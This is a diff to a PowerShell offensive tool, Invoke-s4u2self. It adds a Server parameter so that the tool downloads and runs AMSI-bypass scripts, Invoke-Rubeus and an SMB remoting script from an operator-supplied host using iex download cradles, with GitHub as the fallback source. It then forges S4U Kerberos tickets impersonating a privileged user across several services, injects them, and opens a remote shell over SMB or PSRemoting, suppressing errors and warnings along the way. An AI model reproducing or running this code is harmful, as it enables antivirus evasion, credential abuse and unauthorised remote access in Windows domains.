@@ -33,6 +33,9 @@ function Invoke-s4u2self {
 	.PARAMETER Impersonate
 	User you want to impersonate - a user we know is a local admin (e.g.: a Domain Admin)
 	
+	.PARAMETER Server
+	Serve scripts from provided IP (specify port as follows if not 80: IP:PORT)
+	
 	.PARAMETER SMBRemoting
 	Use SMBRemoting to get a shell on the Target
 	
@@ -82,6 +85,10 @@ function Invoke-s4u2self {
 		[String]
 		$Impersonate,
 		
+		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
+		[String]
+		$Server,
+		
 		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
 		[switch]
 		$PSRemoting,
@@ -115,9 +122,16 @@ function Invoke-s4u2self {
 	
 	$FQDNHostname = $CleanHostname + "." + $Domain
 	
-	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1')
-	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/NETAMSI.ps1') > $null
-	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Rubeus.ps1')
+	if($Server){
+		iex(new-object net.webclient).downloadstring("http://$($Server)/SimpleAMSI.ps1")
+		iex(new-object net.webclient).downloadstring("http://$($Server)/NETAMSI.ps1") > $null
+		iex(new-object net.webclient).downloadstring("http://$($Server)/Invoke-Rubeus.ps1")
+	}
+	else{
+		iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1')
+		iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/NETAMSI.ps1') > $null
+		iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Rubeus.ps1')
+	}
 	
 	# Define set of commands
 	
@@ -159,8 +173,26 @@ function Invoke-s4u2self {
 	
 	
 	if($SMBRemoting){
-	
-	$commands = @"
+		if($Server){
+			$commands = @"
+`$ErrorActionPreference = 'SilentlyContinue'
+`$WarningPreference = 'SilentlyContinue'
+iex(new-object net.webclient).downloadstring('http://$($Server)/SimpleAMSI.ps1') > `$null
+iex(new-object net.webclient).downloadstring('http://$($Server)/NETAMSI.ps1') > `$null
+iex(new-object net.webclient).downloadstring('http://$($Server)/Invoke-Rubeus.ps1') > `$null
+iex(new-object net.webclient).downloadstring('http://$($Server)/Invoke-SMBRemoting.ps1') > `$null
+Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:cifs/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
+Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:http/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
+Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:host/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
+Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:ldap/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
+Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:wsman/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
+Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:mssql/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
+Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:rpcss/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
+Invoke-SMBRemoting -ComputerName $FQDNHostname
+"@
+		}
+		else{
+			$commands = @"
 `$ErrorActionPreference = 'SilentlyContinue'
 `$WarningPreference = 'SilentlyContinue'
 iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1') > `$null
@@ -176,11 +208,29 @@ Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:mssql/$FQDNHos
 Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:rpcss/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
 Invoke-SMBRemoting -ComputerName $FQDNHostname
 "@
+		}
 	}
 	
 	elseif($PSRemoting){
-		
-	$commands = @"
+		if($Server){
+			$commands = @"
+`$ErrorActionPreference = 'SilentlyContinue'
+`$WarningPreference = 'SilentlyContinue'
+iex(new-object net.webclient).downloadstring('http://$($Server)/SimpleAMSI.ps1') > `$null
+iex(new-object net.webclient).downloadstring('http://$($Server)/NETAMSI.ps1') > `$null
+iex(new-object net.webclient).downloadstring('http://$($Server)/Invoke-Rubeus.ps1') > `$null
+Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:cifs/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
+Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:http/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
+Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:host/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
+Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:ldap/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
+Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:wsman/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
+Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:mssql/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
+Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:rpcss/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
+Enter-PSSession -ComputerName $FQDNHostname
+"@
+		}
+		else{
+			$commands = @"
 `$ErrorActionPreference = 'SilentlyContinue'
 `$WarningPreference = 'SilentlyContinue'
 iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1') > `$null
@@ -195,6 +245,7 @@ Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:mssql/$FQDNHos
 Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:rpcss/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
 Enter-PSSession -ComputerName $FQDNHostname
 "@
+		}
 	}
 	
 	else{
